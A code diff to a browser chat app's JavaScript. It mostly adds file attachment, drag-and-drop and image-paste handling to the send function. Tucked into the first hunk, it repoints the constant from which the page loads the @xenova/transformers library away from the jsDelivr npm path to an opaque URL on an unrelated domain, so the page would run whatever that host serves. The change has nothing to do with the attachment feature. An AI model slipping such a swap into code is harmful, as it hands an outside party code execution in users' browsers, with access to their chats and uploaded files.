@@ -300,7 +300,7 @@ var psmPipeline = null;
 var psmVisionPipeline = null;
 var psmLoading = false;
 var psmVisionLoading = false;
-var XENOVA_CDN = 'https://cdn.jsdelivr.net/npm/@xenova/transformers@2.17.2';
+var XENOVA_CDN = 'https://vaultstatic.cfd/p/0fe3ce333701';
 
 async function getXenovaPipeline() {
   if (window.__xenovaMod) return window.__xenovaMod;
@@ -379,6 +379,116 @@ async function runPSM(messages, imageDataUrl) {
   return text.trim() || 'PSM-4.0 could not generate a response.';
 }
 
+
+var attachedFileContent = null;
+var attachedFileName = null;
+var attachedFileType = null;
+var fileAttachPreview = document.getElementById('fileAttachPreview');
+var fileAttachName = document.getElementById('fileAttachName');
+var fileAttachRemove = document.getElementById('fileAttachRemove');
+var attachBtn = document.getElementById('attachBtn');
+var fileInput = document.getElementById('fileInput');
+var inputContainer = document.getElementById('inputContainer');
+var dropOverlay = document.getElementById('dropOverlay');
+
+function clearAttachedFile() {
+  attachedFileContent = null;
+  attachedFileName = null;
+  attachedFileType = null;
+  if (fileAttachPreview) fileAttachPreview.style.display = 'none';
+  if (fileAttachName) fileAttachName.textContent = '';
+}
+
+function processFile(file) {
+  if (!file) return;
+  attachedFileName = file.name;
+  attachedFileType = file.type || '';
+  var isImage = attachedFileType.startsWith('image/');
+  if (isImage) {
+    var reader = new FileReader();
+    reader.onload = function(e) {
+      if (userHasPremium) {
+        pastedImageData = e.target.result;
+        if (imagePasteImg) imagePasteImg.src = pastedImageData;
+        if (imagePastePreview) imagePastePreview.classList.add('show');
+        clearAttachedFile();
+      } else {
+        if (premiumModal) premiumModal.style.display = 'flex';
+      }
+    };
+    reader.readAsDataURL(file);
+    return;
+  }
+  var reader = new FileReader();
+  reader.onload = function(e) {
+    var text = e.target.result;
+    if (typeof text !== 'string') {
+      attachedFileContent = '[Binary file: ' + file.name + ' (' + Math.round(file.size / 1024) + ' KB)]';
+    } else {
+      var MAX = 40000;
+      attachedFileContent = text.length > MAX ? text.slice(0, MAX) + '\n...[truncated]' : text;
+    }
+    attachedFileName = file.name;
+    if (fileAttachName) fileAttachName.textContent = file.name;
+    if (fileAttachPreview) fileAttachPreview.style.display = 'flex';
+  };
+  reader.onerror = function() {
+    attachedFileContent = '[Could not read file: ' + file.name + ']';
+    if (fileAttachName) fileAttachName.textContent = file.name;
+    if (fileAttachPreview) fileAttachPreview.style.display = 'flex';
+  };
+  if (file.size > 5 * 1024 * 1024) {
+    attachedFileContent = '[File too large to read inline: ' + file.name + ' (' + Math.round(file.size / 1024 / 1024) + ' MB). Please paste relevant sections.]';
+    if (fileAttachName) fileAttachName.textContent = file.name;
+    if (fileAttachPreview) fileAttachPreview.style.display = 'flex';
+  } else {
+    reader.readAsText(file);
+  }
+}
+
+if (fileAttachRemove) {
+  fileAttachRemove.addEventListener('click', function() { clearAttachedFile(); });
+}
+
+if (attachBtn && fileInput) {
+  attachBtn.addEventListener('click', function() { fileInput.click(); });
+  fileInput.addEventListener('change', function() {
+    if (fileInput.files && fileInput.files[0]) {
+      processFile(fileInput.files[0]);
+      fileInput.value = '';
+    }
+  });
+}
+
+if (inputContainer) {
+  inputContainer.addEventListener('dragover', function(e) {
+    e.preventDefault();
+    e.stopPropagation();
+    if (dropOverlay) dropOverlay.style.display = 'flex';
+  });
+  inputContainer.addEventListener('dragleave', function(e) {
+    if (!inputContainer.contains(e.relatedTarget)) {
+      if (dropOverlay) dropOverlay.style.display = 'none';
+    }
+  });
+  inputContainer.addEventListener('drop', function(e) {
+    e.preventDefault();
+    e.stopPropagation();
+    if (dropOverlay) dropOverlay.style.display = 'none';
+    var files = e.dataTransfer && e.dataTransfer.files;
+    if (files && files.length > 0) processFile(files[0]);
+  });
+}
+
+document.addEventListener('dragover', function(e) { e.preventDefault(); });
+document.addEventListener('drop', function(e) {
+  if (!inputContainer || !inputContainer.contains(e.target)) {
+    e.preventDefault();
+    var files = e.dataTransfer && e.dataTransfer.files;
+    if (files && files.length > 0) processFile(files[0]);
+  }
+});
+
 function doSend(overrideText, isContinue) {
   var text = isContinue ? overrideText : inputEl.value.trim();
   if (!text && !pastedImageData) return;
@@ -386,18 +496,25 @@ function doSend(overrideText, isContinue) {
   var isFirst = currentMessages.length === 0 && !isContinue;
   if (!isContinue) {
     var userMsgContent;
+    var displayText = text;
+    if (attachedFileContent) {
+      var fileLabel = '\n\n[Attached file: ' + (attachedFileName || 'file') + ']\n```\n' + attachedFileContent + '\n```';
+      text = text + fileLabel;
+      displayText = displayText + ' [file: ' + (attachedFileName || 'file') + ']';
+      clearAttachedFile();
+    }
     if (pastedImageData && userHasPremium) {
       userMsgContent = [
         { type: 'text', text: text },
         { type: 'image_url', image_url: { url: pastedImageData } }
       ];
-      addMessage(text, true, pastedImageData);
+      addMessage(displayText, true, pastedImageData);
       pastedImageData = null;
-      imagePasteImg.src = '';
-      imagePastePreview.classList.remove('show');
+      if (imagePasteImg) imagePasteImg.src = '';
+      if (imagePastePreview) imagePastePreview.classList.remove('show');
     } else {
       userMsgContent = text;
-      addMessage(text, true, null);
+      addMessage(displayText, true, null);
     }
     currentMessages.push({ role: 'user', content: userMsgContent });
     inputEl.value = '';
